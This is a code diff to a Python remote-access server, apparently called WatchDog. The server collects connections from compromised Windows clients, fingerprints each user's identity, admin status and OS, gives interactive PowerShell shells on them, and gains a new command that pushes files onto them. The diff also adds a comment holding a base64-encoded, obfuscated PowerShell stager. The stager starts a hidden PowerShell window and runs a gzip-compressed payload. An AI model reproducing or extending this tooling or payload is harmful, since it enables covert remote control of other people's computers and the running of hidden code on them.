@@ -6,6 +6,8 @@ import threading
 
 colorama.init()
 
+# aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEAQQAwAFQAJwAnACsAJwAnAHIAbQBVAEMAQQA3AHsAMgB9AFcAKwAyAC8AaQBPAEIARAArAGYAYQB7ADEAfQA5AEgANgBJAHsAMgAnACcAKwAnACcAfQBVAGgASQB0AEoAYQBGAGsASAA2ADIAMAAwAGoAbABKAGUAVwB6AEwATQB3AFUASwBMAEQAcQA1AGkAUQBrAHUASgBxAGEASgBVADgAbwArAC8AdgBjAGIAaAA2AFMAUABhADMAdgB7ADEAfQBPADIAawBqAHQAZgBnAHgATQB4ADUALwA4ADgAMgBNAEYAMgBuAGsAQwA4AG8AagBaAHsAMQB9AEcAbAAvAEgAagA3AFIAcwBtAC8ASABvADcAeABXAHQARgBLAHQAMQBHAGoAcgBKAFEAUwBrAGUAcgAzACcAJwArACcAJwBlADYAewAxAH0ARgBZAEsAQgA4AFUAYgAnACcAKwAnACcAUQBaADIAbQB4AGMAdgBzAFkAMABtAGgAOABmAE8AMgBrAGMAawAwAGoAcwA1ADUAVQBHAEUAUwBoAEoAeQBQAHEAUwBVAFoASgBvAHUAdgBKAFQARwBTADkASgBUAEEAJwAnACsAJwAnADYANgBsADEAZgBFAEYAOABvAFAAcABmAFIAbgBwAGMASAA0AEoAVwBhADUAMgBNADcAQgAvAHAASQBvAEIAeQBnAEsANQBOADQAWgA5ADcASAAwAHEAdQBKAHQARwBCAFcAYQArAHUAMgBiAHEAcwA4AE8AcQB2AFAASwB5AHsAMQB9AFcASwBXAGEASwBwADMAaQA0AFIAWgBGADAASgBHAEYATgAxADUAWgBjAHUARAB6AHoAZgBiAFkAaQAnACcAKwAnACcAbQB0AHEAawBmADgANABRAHYAUgBHAHsAMgB9AE0AbwA5AHAAaABaAFIAZwBsAGUARQBFADYAWQBPADIARwB0AEkAbABZADgAaQBCAFIANABTADcAMwB0ADQAbQBKAFMATwBNAG8AdQA1AFMAMABzAHAAZgBSAHsAMgB9AEIAagAyAFkAdQA2AGoASQBJAGgASgBrAHEAaABsAFoAUwBiAHQAegArAGIAegBQADcAUgBaAGYAdgBnAGcAagBRAFIAZABrADAAbwByAEUAaQBUAG0ARwA0AC8ARQBOADkAUQBuAFMAYQBXAEoAbwA0AEMAUgBBAHsAMgB9AG4ATQBRAGMAcwBUAE0AWQAzAEMAdQBhADYARAAyAEEAMQBmAEUAYQAwAFUAcABZAHkAewAyAH0AbABmADkAaQAnACcAKwAnACcAUgB1AHUAUQBiAFEASABkAGEANQBXADAAaAAwAG8AZwAxAFIATwB4AHsAMQB9AG8AYQBBAFAAcgAxAG0AbQB3AGMAcABJADMAdABGADkAUgBrAC8ASgBRAGQAMAArAEgASQBlAEEASABpAC8ASgBIADYATABnAGoAagBiADcANwBUAHoARABIAHsAMQB9AHUARgA0AHAAdgBsAHUAMABRAGMARgBqAHIAOABZAFIAbQB5AGwAOABVAHMANgB5ADAANABXAHcAcwBlAEwAeQBEAGEAZQBrADgAVABvAGsAKwB2ADQATgBiAEsAewAyAH0AMgBMAHIAbAAxACsAcgBiAHsAMgB9AHEAbwBRAHEASwB0ADIANABUAHsAMgB9AG0AWQBqAFQAbwBQADUAdgBmADYAagA0AEoAZABXAEgAegBaAEgAVQB1AGgAbABLAHIAdABrAFEAUwBQAGkANwBpAEsAOABwAG4ANwBCAHsAMgB9AHUAMgA1AGsASgBBAEYASQB4AGsAawBsAFUASwBzAEEAdwA1AHEAYQByADUAQgBBAHAAYwB3AEUAbQBJAGgAVQBaAGIATQBlAEsASgAyAHMAcQBiAGkAVAB0AGQATwBLAFEAdABJAGoASAB3AEkAYQB3AEoAZQBRAGMAVAAxAHgAOAA3AHMAQQA2AGUAcAByAGEAaABOADEAbwBEAGUAZgBnADUAVQBMAFMAMABnAFIAMABnAGgAbgBlAGYARgByAGoAaABkAHoAawBGAEkAZABSAGgATwBrAHIATABTAFMAeQBGAEoALwBiAEwAaQBFAGMAeABJAFUARgBaAFEAbABOAEIAOABDADYAVwBDAFoAMABQADEAMwB0ADEAMgB5AGcAVAAxAGMAUwBJAEsAYwAzAFAAOQBiADMARABtAHgAegBvADgAUwBrAFMAYwArAGgAQgB7ADEAfQBnAE8ARABjADIAeABDAGYAWQBpAFkAUgBLAFMAdABOAEcAaABCADcANQA5AEcAdwBPAEYANQA5AEYAZwA4AEgATQB3AGIASgBBADUAWgB1AEkAQgA2AHcASQBuAEgAdwBoAEcAUgBMAEQASgA1AG0AegBOAEEAcgBIAGgARwB0ADkAWQBhAFIATgBjAGgAawBSAGEAUABPAGMAQQBnAGwASQBrACsAUgBqAEYANAA0AEoASQBIADYAZwBxAE4ARgBLAHUAeAA1AEwANQBFAHAASQBIAG4AZwBKAG8AVABiAFkAMQB5AFUAbABSAEcATgBCAFoAUQBnAGkAVABMAHcANgAzADgANQA4AGIAVAAyAFoATgA0ADQATQBjAG0AagBvAHgAVQA1AE4AcgBOADMAUQBpAFoAQgBLAFkAcQBqAGcAUwB0ADUAbQBvAE8AVQAnACcAKwAnACcAUQBSAEkATABnAEsATQBlADgANwBXAE4ARQAvAEwAUgAyAGwAYwBhADcAWgAzAFIAcABUADAARQAzADgAUgB0AGUAdABPAFcAOABOAHEAdABpAE4ARgBxAHEAdwAxAC8AUQAxAHAAcgBjAGYAZABUAGMAUAByADEAcQBtAG0AMABmAFMAZgBwAE4AZQBxAGYARQBkADIARwBXAC8AOQB6AEIALwBuAEIAMQA0AEEAYwBlAFMATgBMAGUAQwBjAHQANABmAFIAUQBzADAAOQBOADIAMQByADYAdABuAGsAdQB4ADkAVQB3AHAARwBZADQAUQBVAEcAbgB2AC8AUwBaADIAVAB0AFoAMwBSAHAAVwBZAHQASgB0AGMAeQB4AHQANwBXADMANABsAHQAVwA4AE0ARgBHAHQAWgBuAHsAMgB9AHIANQBnAHIAdwBtADQARABlAEMAbgBUAFcAZABIAHQANwBCAG0ATQBvAHEAZAAwAHoAdQAnACcAKwAnACcANQB7ADEAfQBZAFoAbwB1AGQAZgBIAFUARwBsACsAUABEACsAbgBUAE0AbQBvAFoAewAyAH0AewAxAH0AeQA3AEcAUABQAEUAKwBUAGwAegBEAE0ASQA0AEMANwBMAFoAMwBDAE4AawA4AHEATAB7ADIAfQAzAEYAOQBVAEIAUAAyAC8ANgBhADkAdQBLAHUASABIAGsAVwBDAHQAMABnAHAAQQBUAG4AWQB6AHEATgBqACsAZAAyAEQASABxAEcAUwBNAGMAYgB2AGoAMgBOAEQAdwBOAHgAcQBHAEQANwBQAGMAMwBsAEUAegA3AHcANwByAGQAJwAnACsAJwAnADcAOQBkAHQATgBHAHgAYwB7ADEAfQBiAHQASABSAG0AZwBjAGoAUwAvAHcAMABoADYAUABEAHUAbAAwAGMAegBGAFkAdwByAHkAKwBiAGYAWgBQAEQAZABOAHEAQgBlAFEANwBuADIANABCAHUAQQBaAEgATwBCAHkAQQBUAE8AZwBjACsAcwBzAEYAeQBMAGoAdgB3AFcAQwBIAEoANABkADQAWgB7ADEAfQBOAGsAZwAwAHgAOQBlAG8AMABhAHkAOABtAG0AMwBtAE8AdwBmAHoANAA4ADUARwBqAEUATwBoAGMAWQBuAFUAMQAzAGQAYwBPAG8AVABuAG8AVwBhAHAAcAA4ADMAQQBoAFIASAA4AFIAeABhAFAAYwB4AFMAbQA3AGMANwA2ADUAUgBIAFEAVQA4AEcASAAvAG8AVABCAGIARwA2AEkASgA5AE0AbAB5AG4AMwAxAHQAZQB5AEQAcwBiAG0ANwB7ADEAfQA4AHYAMgAyADYAJwAnACsAJwAnAHAALwA2ADAAdQB2AFcANwBuAHoANgBmAGoAZQBsAG8AegBkAEgAUQBNAEUAJwAnACsAJwAnAGIAdgBnAEIAVwB6AEkAWQAxAEUANwB7ADEAfQBCAGUAMgBxACcAJwArACcAJwA0AHMAUwB4AGIAUAB0ADIAOQBLAGUATwBqADMASABsAEQAagBwAGMANwBRAHgAbgBHAHkAeABBAHcAbwBBAHoAVwAvAFMATgA0ADYAagArAHQANQBIAGUAOQB4AEsAagAnACcAKwAnACcAVQAwAEQAUgA0AEMASwB4AEoASABoAEUASAAzAGgAUAA1AGEATQBCADQAeAB4AG4AMwBaAFEAcgBKADYARAArADEAcgAzADEAUgBrAGoAeAB1ADIATQBxAGUAZQBHACsAbgBLAG4AYQBCACsAMwAxAHUASwBwAGUAUABqAEsAZgBnAEkAUwBaAFQAeAB1ADMASgBHAG8AbABBAHMAeQArAFoAdAB6AFQAUwBoAEwAWgBpADMAcABwAFcAbAB5ACsAdQB2ADUAdgBEAE4AVAB0AHQAYgBLADgAdgBPAGsAbwBGAHoAWgA1ADkAbAA5AHMARQBrAHsAMQB9AFMAaQBhADkAcgBzAEIAZwArAGUARABnAEUATAAyAE0AbQBRAHYAbwBRAGMAbgByADYARAAnACcAKwAnACcAdQBRAEMASABjAEYAdwBPAEoAbwBjADAANQBlADQAaABnAGYAcgBFADcAUABqAHcAJwAnACsAJwAnAEMARQBKAEMAJwAnACsAJwAnAHIAdwB1AHsAMgB9AG4AOAB1ADIAUQBNAFEAewAyAH0ATQBIAEoAQgByAHAAUwBSAGsAYgAzADMAWQAnACcAKwAnACcAcQAwAHMAMwBjAGYAZAAzAGMAaQBlAHYAYQBVAHYANABDAGYANgBOAE8ALwBkAHIALwA3AEQANwBLAGoANgBaADUAVAAwADgAVAA1AFkAJwAnACsAJwAnAGYATAB6AHoAbwBCADcAOABOAGcARABHAG0AQQB1AFEAOABxAE0AeQAnACcAKwAnACcATQA3AE4AOABMAHoAKwBPAFEAcAA4AHUARABDAEUATgBvAEkAQgBVAFcAKwBTAGYAZgAwAE4AMQBVAEgASABUAGcAewAyAH0AWgBaADEAaAA3ADgAQQBQAGUAMgBBAFcANwBrAEwAQQBBAEEAewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBYACcAJwAsACcAJwBWACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
+
 class WatchDog:
     def __init__(self):
         self.running = True
@@ -29,9 +31,7 @@ class WatchDog:
 
         self.s_f = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self.s_f.connect(("8.8.8.8", 80))
-
         
-
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.settimeout(2)
 
@@ -51,24 +51,27 @@ class WatchDog:
         print("")
         self.start()
 
-    def cmd_WhoAmI(self, conn):
+    def cmd_text_connection(self, conn):
         try:
-            conn.send(bytes("whoami", "utf-8"))
+            conn.send(bytes("Write-Output '   '", "utf-8"))
             rm = conn.recv(64).decode("utf-8")
             return rm[0:-2]
         except:
             return 0
+
+    def cmd_WhoAmI(self, conn):
+        conn.send(bytes("whoami", "utf-8"))
+        rm = conn.recv(64).decode("utf-8")
+        return rm[0:-2]
     
     def cmd_Check_Privileges(self, conn):
         conn.send(bytes("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)", "utf-8"))
         rm = conn.recv(16).decode("utf-8")
-
         return rm[0:-2]
     
     def cmd_OS_name(self, conn):
         conn.send(bytes("$osInfo = Get-CimInstance Win32_OperatingSystem; $osInfo.Caption", "utf-8"))
         rm = conn.recv(32).decode("utf-8")
-
         return rm[0:-2]
 
     def test_connections(self):
@@ -76,14 +79,19 @@ class WatchDog:
             time.sleep(10)
             for pp in self.data_clients:
                 if not pp[5]:
-                    if not self.cmd_WhoAmI(pp[0]):
+                    if not self.cmd_text_connection(pp[0]):
                         print('\r' + ' ' * 30 + '\r', end='', flush=True)
                         print(f"{colorama.Fore.RED}[-] {colorama.Fore.LIGHTMAGENTA_EX}client has disconnected IP:{pp[1]}, User: {pp[2]}, Admin: {pp[3]}, OS: {pp[4]}{colorama.Fore.LIGHTBLUE_EX}")
                         print(self.WatchDog_Input_Text, end='', flush=True)
                         self.data_clients.remove(pp)
 
+    def exit_all_clients(self):
+        for pp in self.data_clients:
+            pp[0].close()
+
     def listening(self):
         while self.running:
+            time.sleep(2)
             if self.server["listening"] == "true":
                 try:
                     conn, addr = self.s.accept()
@@ -91,23 +99,24 @@ class WatchDog:
 
                     User_name = self.cmd_WhoAmI(conn)
                     Check_Privileges = self.cmd_Check_Privileges(conn)
-                    Name_os = self.cmd_OS_name(conn)
+                    name_os = self.cmd_OS_name(conn)
 
-                    print(f"{colorama.Fore.GREEN}[+] {colorama.Fore.LIGHTMAGENTA_EX}Client connected IP: {addr[0]}, User: {User_name}, Admin: {Check_Privileges}, OS: {Name_os}{colorama.Fore.LIGHTBLUE_EX}")
+                    print(f"{colorama.Fore.GREEN}[+] {colorama.Fore.LIGHTMAGENTA_EX}Client connected IP: {addr[0]}, User: {User_name}, Admin: {Check_Privileges}, OS: {name_os}{colorama.Fore.LIGHTBLUE_EX}")
                     print(self.WatchDog_Input_Text, end='', flush=True)
 
-                    self.data_clients.append([conn, addr[0], User_name, Check_Privileges, Name_os, False])
+                    self.data_clients.append([conn, addr[0], User_name, Check_Privileges, name_os, False])
 
                 except socket.timeout:
                     pass
-            time.sleep(2)
-        print("Server is off...")
+        print("Wait...")
+
+        self.exit_all_clients()
 
     def sessions(self):
         client_number = 0
         print("")
         for pp in self.data_clients:
-            print(f"{colorama.Fore.LIGHTMAGENTA_EX}Client {client_number} connected IP: {pp[1]}, User: {pp[2]}, Admin: {pp[3]} OS: {pp[4]}")
+            print(f"{colorama.Fore.LIGHTMAGENTA_EX}Client {client_number} connected IP: {pp[1]}, User: {pp[2]}, Admin: {pp[3]}, OS: {pp[4]}")
             client_number += 1
         print("")
 
@@ -143,8 +152,7 @@ class WatchDog:
                     continue
                 elif co == "help":
                     print("")
-                    print("you can use powershell commands or")
-                    print("viewscreen")
+                    print("you can use powershell commands")
                     print("")
                     continue
 
@@ -157,15 +165,39 @@ class WatchDog:
                     except socket.timeout:
                         break
 
-        except:
-            print("shell error")
+        except Exception as e:
+            print("shell error: {e}")
 
         self.WatchDog_Input_Text = f"{colorama.Fore.RED}@WatchDog>{colorama.Fore.LIGHTBLUE_EX}"
+
+    def transfer(self, commands):
+        # transfer 0 C:\Users\lasse\Desktop\WatchDog\test_message.txt new_name.text
+
+        # New-Item -ItemType File -Name "YourFile.txt"
+        # Set-Content -Path "YourFile.txt" -Value "Hello, this is the content of the file."
+
+        client_n = int(commands[1])
+
+        try:
+            self.data_clients[client_n][0].settimeout(0.8)
+            self.data_clients[client_n][0].send(bytes(f"""New-Item -ItemType File -Name "{commands[3]}" """, "utf-8"))
+            self.data_clients[client_n][0].recv(16)
+
+            r = open(f"{commands[2]}", "r")
+            text = r.read()
+            r.close()
+
+            self.data_clients[client_n][0].send(bytes(f"""Set-Content -Path "{commands[3]}" -Value "{text}" """, "utf-8"))
+            self.data_clients[client_n][0].recv(16)
+
+        except Exception as e:
+            print(f"transfer error: {e}")
 
     def start(self):
         while True:
             print(self.WatchDog_Input_Text, end="")
-            command = input().lower().split(" ")
+            comman = input().lower().split(" ")
+            command = [item for item in comman if item != '']
 
             if command[0] == "help":
                 print("")
@@ -206,6 +238,9 @@ class WatchDog:
                 print("shell <client's number>")
                 print("")
                 print("")
+                print("transfer <client_number> <file/path/name.txt> <give name to file>")
+                print("")
+                print("")
             elif command[0] == "exit":
                 print("")
                 print("Closing Server...")
@@ -224,6 +259,8 @@ class WatchDog:
                 else:
                     if len(command) > 1:
                         self.shell(int(command[1]))
+            elif command[0] == "transfer":
+                self.transfer(command)
             elif command[0] == "sessions":
                 self.sessions()
 
